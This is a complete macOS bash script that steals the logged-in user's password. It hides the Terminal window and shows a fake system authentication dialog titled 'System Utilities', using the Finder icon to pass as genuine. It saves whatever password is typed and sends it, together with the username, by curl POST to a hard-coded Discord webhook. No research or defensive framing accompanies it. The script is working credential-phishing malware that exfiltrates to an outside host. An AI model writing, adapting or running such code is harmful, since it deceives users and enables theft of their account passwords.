#!/bin/bash

# Ensure Terminal is hidden initially
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get the current username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Initialize capture with a header line
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Define AppleScript for the password prompt with a 10-second timeout
read -r -d '' applescriptCode <<'EOF'
set msg1 to "MacOS is trying to authenticate user.\n\nEnter the password for the user "
set username to long user name of (system info)
set msg2 to " to allow this."
try
    set dialogText to text returned of (display dialog (msg1 & username & msg2) with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer giving up after 10)
    return dialogText
on error
    return "CANCEL"
end try
EOF

# Launch the AppleScript dialog asynchronously and capture its output in a temporary file
osascript -e "$applescriptCode" > pass_temp.txt &

# Show Terminal for the countdown
osascript -e 'tell app "Terminal" to set visible of front window to true'

# Display a 10-second countdown in Terminal
echo "Enter password in the prompt within 10 seconds..."
for ((i=10; i>=1; i--)); do
    echo "$i seconds remaining..."
    sleep 1
done

# Wait for the background AppleScript process to complete
wait

# Read the password from the temporary file
if [ -f pass_temp.txt ]; then
    dialogText=$(cat pass_temp.txt)
    rm pass_temp.txt
else
    dialogText="CANCEL"
fi

# Append the password (or timeout result) to the capture
capture="${capture}password=${dialogText}"

# Save the captured information to pass.txt
echo -e "$capture" > pass.txt

# Send captured data to the Discord webhook using Python for proper JSON formatting
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
